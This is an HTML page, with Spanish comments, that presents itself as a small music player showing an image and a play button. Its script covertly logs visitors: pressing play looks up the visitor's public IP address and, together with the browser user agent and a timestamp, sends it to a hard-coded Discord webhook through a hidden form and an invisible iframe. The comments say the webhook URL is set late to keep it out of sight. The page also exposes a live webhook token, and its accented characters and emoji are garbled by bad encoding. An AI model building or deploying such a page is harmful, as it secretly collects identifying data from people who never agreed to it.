<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Animooooo</title>
  <style>
    body { margin:0; padding:0; height:100vh; display:flex; justify-content:center; align-items:center; background:#111; font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;}
    .container { position:relative; width:100%; max-width:600px; }
    .container img { width:100%; height:auto; display:block; }
    .btn { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background:#ff4b4b; color:#fff; padding:12px 20px; font-size:16px; border:none; cursor:pointer; border-radius:8px; text-decoration:none; transition:background .3s, transform .2s; line-height:1; display:inline-flex; align-items:center; gap:8px; user-select:none; }
    .btn:hover { background:#d63c3c; transform:translate(-50%,-50%) scale(1.05); }
    .mini-player { position:absolute; left:50%; transform:translate(-50%,20px); top:calc(50% + 60px); width:min(90%,340px); background:rgba(0,0,0,.7); backdrop-filter:blur(4px); border:1px solid rgba(255,255,255,.15); border-radius:10px; padding:8px; opacity:0; pointer-events:none; transition:opacity .4s ease, transform .4s ease; }
    .mini-player.show { opacity:1; transform:translate(-50%,0); pointer-events:auto; }
    .mini-player .close { position:absolute; top:-10px; right:-10px; background:#ff4b4b; border:none; color:#fff; font-size:16px; cursor:pointer; line-height:1; padding:4px 6px; border-radius:50%; }
    .mini-player .close:hover { background:#d63c3c; }
    .mini-player audio { width:100%; display:block; }
    @media (max-width:480px){ .btn{ padding:10px 15px; font-size:14px;} .mini-player{ top:calc(50% + 52px);} }

    /* iframe oculto para el POST del webhook (sin redirigir) */
    iframe#sink { display:none; width:0; height:0; border:0; }
  </style>
</head>
<body>
  <div class="container">
    <img src="gaby3.jpg" alt="Imagen est√°tica">

    <a href="#play" class="btn" id="playBtn" aria-label="Reproducir canci√≥n">
      <span id="playIcon">‚ñ∂Ô∏è</span><span id="playText">Reproducir</span>
    </a>

    <div class="mini-player" id="audioMiniPlayer" aria-label="Mini reproductor de audio">
      <button class="close" id="closePlayer" aria-label="Cerrar reproductor">‚úï</button>
      <audio id="audioEl" preload="metadata" controls controlsList="nodownload">
        <source src="song.mp3" type="audio/mpeg">
        Tu navegador no soporta audio HTML5.
      </audio>
    </div>
  </div>

  <!-- iframe ‚Äúsumidero‚Äù para que el form se env√≠e sin salir de la p√°gina -->
  <iframe id="sink" name="sink"></iframe>

  <!-- form para el webhook (se rellena y env√≠a por JS) -->
  <form id="webhookForm" method="POST" target="sink" enctype="multipart/form-data">
    <!-- Importante: el action se pone por JS para no dejar la URL a simple vista -->
    <input type="hidden" name="payload_json" id="payload_json" />
  </form>

  <script>
    // ====== PON AQU√ç TU WEBHOOK DE DISCORD (mejor uno NUEVO) ======
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1404580674421260308/ZNM7mG59FGW9epp7zeX-bi-D7zl4QGFfP_T02nkkXSj2946rwiHIyoIisQIShSTL7gMA";
    // ==============================================================

    const playBtn  = document.getElementById('playBtn');
    const playIcon = document.getElementById('playIcon');
    const playText = document.getElementById('playText');
    const mini     = document.getElementById('audioMiniPlayer');
    const audio    = document.getElementById('audioEl');
    const closeBtn = document.getElementById('closePlayer');
    const form     = document.getElementById('webhookForm');
    const payloadI = document.getElementById('payload_json');

    // throttle local para no spamear (30s entre avisos por dispositivo/navegador)
    const LS_KEY = 'lastNotifyTs';
    function canNotifyNow() {
      const last = Number(localStorage.getItem(LS_KEY) || 0);
      const now = Date.now();
      if (now - last < 30_000) return false;
      localStorage.setItem(LS_KEY, String(now));
      return true;
    }

    function showMiniPlayer(){ mini.classList.add('show'); }
    function hideMiniPlayer(){ mini.classList.remove('show'); }
    function setButtonState(isPlaying){
      if (isPlaying) { playIcon.textContent='‚è∏Ô∏è'; playText.textContent='Pausar'; }
      else { playIcon.textContent='‚ñ∂Ô∏è'; playText.textContent='Reproducir'; }
    }

    async function getPublicIP() {
      try {
        const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
        if (!r.ok) throw new Error('HTTP '+r.status);
        const { ip } = await r.json();
        return ip || 'desconocida';
      } catch(e) {
        return 'desconocida';
      }
    }

    // Construye y env√≠a el POST al webhook sin redirigir (form + iframe)
    async function notifyDiscordSilent() {
      if (!canNotifyNow()) return;

      // peque√±o timeout: no esperes m√°s de 1s por la IP
      const ipPromise = getPublicIP();
      const timeout = new Promise(res => setTimeout(() => res('desconocida'), 1000));
      const ip = await Promise.race([ipPromise, timeout]);

      const unix = Math.floor(Date.now()/1000);
      const content =
        `üéµ **Play presionado**\n` +
        `- Pista: \`song.mp3\`\n` +
        `- Fecha: <t:${unix}:F>\n` +
        `- IP: \`${ip}\`\n` +
        `- UA: \`${navigator.userAgent.slice(0,180)}\``;

      const payload = {
        username: "Notificador",
        // evita que @everyone/@here funcionen por accidente
        allowed_mentions: { parse: [] },
        content
      };

      // setear el action en el √∫ltimo momento (ofuscaci√≥n m√≠nima)
      form.setAttribute('action', WEBHOOK_URL);
      payloadI.value = JSON.stringify(payload);

      // dispara el env√≠o
      form.submit();
    }

    playBtn.addEventListener('click', async (e) => {
      e.preventDefault();
      showMiniPlayer();
      try {
        if (audio.paused) {
          await audio.play();
          setButtonState(true);
          notifyDiscordSilent(); // ‚Üê sin redirigir
        } else {
          audio.pause();
          setButtonState(false);
        }
      } catch (err) {
        console.error('No se pudo reproducir:', err);
        alert('No se pudo reproducir el audio. Verifica la ruta del archivo MP3.');
      }
    });

    audio.addEventListener('play',  () => setButtonState(true));
    audio.addEventListener('pause', () => setButtonState(false));
    audio.addEventListener('ended', () => setButtonState(false));
    closeBtn.addEventListener('click', () => { audio.pause(); hideMiniPlayer(); setButtonState(false); });
  </script>
</body>
</html>
